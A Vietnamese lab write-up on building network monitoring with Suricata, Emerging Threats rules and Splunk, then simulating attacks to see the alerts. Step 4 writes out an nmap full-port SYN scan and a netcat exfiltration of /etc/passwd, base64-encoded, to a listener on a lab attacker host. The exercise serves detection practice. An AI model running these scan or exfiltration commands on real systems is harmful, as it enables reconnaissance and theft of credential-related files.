# Thiết lập hệ thống giám sát mạng bằng Suricata và Splunk để phát hiện các hành vi bất thường trong lưu lượng mạng

## 1. Mục tiêu

- Thiết lập một hệ thống giám sát mạng để phát hiện các mẫu lưu lượng bất thường, bao gồm cả việc xâm nhập dữ liệu và giao tiếp command-and-control (C2), bằng cách sử dụng Suricata với các quy tắc Emerging Threats (ET) và phân tích nhật ký bằng Splunk.
- Mô phỏng một cuộc tấn công dựa trên mạng và phản ứng với các cảnh báo được tạo bởi các quy tắc ET.

## 2. Kiến thức nền

- **Suricata:** Là một công cụ giám sát mạng và phát hiện xâm nhập (IDS) mạnh mẽ.  Nó phân tích lưu lượng mạng theo thời gian thực và có thể phát hiện các hoạt động độc hại.
- **Emerging Threats (ET) Rules:** Một bộ quy tắc nguồn mở được sử dụng với Suricata để phát hiện nhiều loại mối đe dọa, bao gồm phần mềm độc hại, giao tiếp C2 và xâm nhập dữ liệu.
- **Splunk Universal Forwarder:** Một thành phần của Splunk, được cài đặt trên các máy chủ để thu thập và chuyển tiếp nhật ký đến một Splunk Server trung tâm để phân tích.
- **Splunk:** Một nền tảng phần mềm mạnh mẽ để tìm kiếm, phân tích và trực quan hóa dữ liệu nhật ký.  Nó cho phép các nhà phân tích bảo mật xác định các xu hướng, điều tra sự cố và giám sát hoạt động của mạng.

## 3. Sơ đồ mạng

<img width="750" height="392" alt="Suricata+splunk" src="https://github.com/user-attachments/assets/ae4f6a81-9529-4710-b9c4-0a1d1fb5547f" />

## 4. Các bước tiến hành

### Bước 1: Chuẩn bị môi trường

- Tải và cài đặt máy ảo Ubuntu Server 22.04 và Kali Linux 2025.1a qua VMware Player.
    - Ubuntu Server: https://releases.ubuntu.com/jammy/ubuntu-22.04.5-live-server-amd64.iso
    - Kali Linux: https://cdimage.kali.org/kali-2025.1a/kali-linux-2025.1a-vmware-amd64.7z
- Thực hiện cài đặt, cấu hình Splunk Server trên Windows và Splunk Universal Forwarder trên Ubuntu Server theo hướng dẫn tại: [https://github.com/0xrajneesh/90-days-security-challenge/blob/main/Challenge%231/Lab Set up.md](https://github.com/0xrajneesh/90-days-security-challenge/blob/main/Challenge%231/Lab%20Set%20up.md)

### Bước 2: Cài đặt và cấu hình Suricata

1. **Cài đặt Suricata**

```
sudo add-apt-repository ppa:oisf/suricata-stable
sudo apt-get update
sudo apt-get install suricata -y
```

<img width="1143" height="472" alt="image" src="https://github.com/user-attachments/assets/3b75c933-4b20-470c-9635-686da8579863" />

2. **Tải các quy tắc Emerging threats**

```
cd /tmp/ 
curl -LO https://rules.emergingthreats.net/open/suricata-7.0.3/emerging.rules.tar.gz
sudo tar -xvzf emerging.rules.tar.gz 
sudo mkdir /etc/suricata/rules 
sudo mv rules/*.rules /etc/suricata/rules/
sudo chmod 640 /etc/suricata/rules/*.rules
```

<img width="971" height="418" alt="image" src="https://github.com/user-attachments/assets/f73cbbdd-80e4-4453-bd4a-5c18d49c8124" />

3. **Cập nhật cấu hình Suricata**

- Mở tệp cấu hình Suricata

```
sudo nano /etc/suricata/suricata.yaml
```

- Cập nhật HOME_NET, EXTERNAL_NET, defaut-rule-path, rule-files

<img width="651" height="361" alt="image" src="https://github.com/user-attachments/assets/c75d35fd-90ab-4a76-b8f4-b16d66b0edf4" />

<img width="612" height="295" alt="image" src="https://github.com/user-attachments/assets/62aa1950-99c8-4073-8c8e-19c6abf4ca78" />


4. **Khởi động lại dịch vụ Suricata**

```
sudo systemctl restart suricata
sudo systemctl start suricata
sudo systemctl enable suricata
sudo systemctl status suricata
```

<img width="944" height="287" alt="image" src="https://github.com/user-attachments/assets/9a764aae-4494-43fc-ba8c-e40cd613e3a5" />

### Bước 3: Cấu hình Splunk Forwarder theo dõi log của Suricata

1. **Chỉnh sửa tệp cấu hình đầu vào của Splunk**

- Mở file cấu hình

```
sudo nano /opt/splunkforwarder/etc/system/local/inputs.conf
```

- Thêm nội dung sau để giám sát log của Suricata

```
[monitor:///var/log/suricata/eve.json]
sourcetype = suricata
index = network_security_logs
```

2. **Lưu và khởi động lại Splunk Forwarder**

```
sudo /opt/splunkforwarder/bin/splunk restart
```

3. **Xác minh chuyển tiếp log thành công**

- Trên Splunk server, tạo index mới để nhận log từ Suricata

<img width="809" height="570" alt="image" src="https://github.com/user-attachments/assets/6e42928d-259c-4e64-8aca-2546b5e2620c" />

- Thực hiện ping đến Ubuntu(cài Splunk Forwader) và quan sát phía Splunk server, có thể thấy Splunk đã nhận log từ Suricata

<img width="1186" height="648" alt="image" src="https://github.com/user-attachments/assets/79aaeada-178b-403a-b761-39a916fe9e0e" />

### Bước 4: Mô phỏng các cuộc tấn công mạng

1. **Quét cổng bằng Nmap**
- Sử dụng `nmap` chế độ quét SYN để tìm các cổng mở trên máy nạn nhân. Hành vi này thường được sử dụng trong giai đoạn reconnaissance và có thể bị phát hiện bởi IDS là hành vi nguy hại

```
nmap -sS -T4 -p- 192.168.100.20
```

<img width="676" height="417" alt="image" src="https://github.com/user-attachments/assets/056e6094-62be-4ca2-afac-0b0c72fdea7a" />

2. **Mô phỏng trích xuất thông tin từ máy nạn nhân**

- Mô phỏng việc mã hóa và gửi nội dung file hệ thống nhạy cảm tới kẻ tấn công thông qua `netcat`

```
# Attacker
nc -lvnp 5555

# Victim
cat /etc/passwd | base64 | nc 192.168.0.30 5555
```

<img width="786" height="697" alt="image" src="https://github.com/user-attachments/assets/c4c39ad2-e47f-4eb4-988b-244d2d00253e" />

### Bước 5: Phân tích log

#### Log của hành vi quét cổng

```
{ [-]
   alert: { [-]
     action: allowed
     category: Potentially Bad Traffic
     gid: 1
     metadata: { [+]
     }
     rev: 3
     severity: 2
     signature: ET SCAN Suspicious inbound to Oracle SQL port 1521
     signature_id: 2010936
   }
   dest_ip: 192.168.0.20
   dest_port: 1521
   direction: to_server
   event_type: alert
   flow: { [-]
     bytes_toclient: 0
     bytes_toserver: 60
     dest_ip: 192.168.0.20
     dest_port: 1521
     pkts_toclient: 0
     pkts_toserver: 1
     src_ip: 192.168.0.30
     src_port: 47182
     start: 2026-03-02T23:28:23.155291+0700
   }
   flow_id: 2074347087003202
   in_iface: ens33
   ip_v: 4
   pkt_src: wire/pcap
   proto: TCP
   src_ip: 192.168.0.30
   src_port: 47182
   timestamp: 2026-03-02T23:28:23.155291+0700
}

    alert.signature = ET SCAN Suspicious inbound to Oracle SQL port 1521
    host = hoang
    source = /var/log/suricata/eve.json
    sourcetype = suricata
```

#### Log của hành vi trích xuất thông tin nhạy cảm

```
{ [-]
   alert: { [-]
     action: allowed
     category: Attempted User Privilege Gain
     gid: 1
     metadata: { [+]
     }
     rev: 2
     severity: 1
     signature: ET EXPLOIT bin bash base64 encoded Remote Code Execution 2
     signature_id: 2025805
   }
   dest_ip: 192.168.0.30
   dest_port: 5555
   direction: to_server
   event_type: alert
   flow: { [-]
     bytes_toclient: 140
     bytes_toserver: 5373
     dest_ip: 192.168.0.30
     dest_port: 5555
     pkts_toclient: 2
     pkts_toserver: 6
     src_ip: 192.168.0.20
     src_port: 57148
     start: 2026-03-02T23:38:11.100656+0700
   }
   flow_id: 995265164925303
   in_iface: ens33
   ip_v: 4
   pkt_src: wire/pcap
   proto: TCP
   src_ip: 192.168.0.20
   src_port: 57148
   timestamp: 2026-03-02T23:38:11.137019+0700
}

    alert.signature = ET EXPLOIT bin bash base64 encoded Remote Code Execution 2
    host = hoang
    source = /var/log/suricata/eve.json
    sourcetype = suricata
```
